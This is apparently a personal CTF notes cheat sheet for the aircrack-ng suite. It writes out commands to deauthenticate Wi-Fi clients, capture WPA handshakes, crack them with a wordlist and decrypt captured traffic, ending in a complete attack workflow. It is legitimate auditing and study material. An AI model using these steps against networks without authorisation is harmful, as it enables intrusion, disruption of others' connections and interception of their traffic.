# aircrack-ng

```
Description: auditing Wi-Fi security

# Show wireless interfaces
AsianHacker-picoctf@webshell:/tmp$ ip link show                               
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
2: eth0@if1268276: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP mode DEFAULT group default 
    link/ether 16:02:da:05:1f:f7 brd ff:ff:ff:ff:ff:ff link-netnsid 0

AsianHacker-picoctf@webshell:/tmp$ iwconfig  
lo        no wireless extensions.

eth0      no wireless extensions.

# Kill processes that interfere with monitor mode
AsianHacker-picoctf@webshell:/tmp$ sudo airmon-ng check kill
AsianHacker-picoctf@webshell:/tmp$ sudo systemctl start NetworkManager
```

# airmon-ng (monitor mode)
```
sudo airmon-ng start wlan0          # Start monitor mode on an interface
sudo airmon-ng stop wlan0mon        # Stop monitor mode
sudo aireplay-ng --test wlan0mon    # Test if card supports injection
```

# airodump-ng (capture/scan all channels and show nearby APs/clients)
```
sudo airodump-ng wlan0mon           # Scan all channels and show nearby APs/clients

# Capture traffic for a specific AP and save to capturefile-01.cap or .csv
sudo airodump-ng --bssid <BSSID> --channel <CHANNEL> -w capturefile wlan0mon

# Capture only a channel (no BSSID filter)
sudo airodump-ng --channel <CHANNEL> -w capturefile wlan0mon
```

# aireplay-ng (injection / force handshakes)
```
# Deauthenticate a single client (force reauth to capture handshake)
sudo aireplay-ng --deauth 10 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon

# Broadcast deauth to all clients (use carefully)
sudo aireplay-ng --deauth 10 -a <AP_BSSID> wlan0mon

# Fake authentication (useful for WEP or associated attacks)
sudo aireplay-ng --fakeauth 10 -a <AP_BSSID> -h <YOUR_CLIENT_MAC> wlan0mon

# ARP replay (WEP traffic generation)
sudo aireplay-ng --arpreplay -b <AP_BSSID> -h <YOUR_CLIENT_MAC> wlan0mon
```

# aircrack-ng (crack the key)
```
# Basic WPA/WPA2 cracking (dictionary attack)
aircrack-ng -w /path/to/wordlist.txt -b <AP_BSSID> capturefile-01.cap

Tip: Can use hashcat, convert capture to hash format. Use hashcat’s cap2hccapx utility (from hashcat-utils) or aircrack-ng’s converter (check your local version) to produce .hccapx for hashcat
```

# airdecap-ng (decrypt capture after you have key)
```
# Decrypt a capture (WEP/WPA) once you have the key
airdecap-ng -e "<ESSID>" -p "<password>" capturefile-01.cap
```

## Example: Common workflow example (WPA/WPA2)
```
# Put card in monitor mode
sudo airmon-ng start wlan0

# Capture handshake for target
sudo airodump-ng --bssid 00:11:22:33:44:55 --channel 6 -w mycap wlan0mon

# (In another terminal) force deauth to capture handshake
sudo aireplay-ng --deauth 10 -a 00:11:22:33:44:55 wlan0mon

# When mycap-01.cap contains a handshake, run aircrack-ng
aircrack-ng -w ~/wordlists/rockyou.txt -b 00:11:22:33:44:55 mycap-01.cap

# If cracked, decrypt with airdecap-ng as needed
```

## CTF
[picoGym0237: aircrack-ng](../picoCTF/picoGym0237.md)

## Back to README.md
[BACK](../README.md)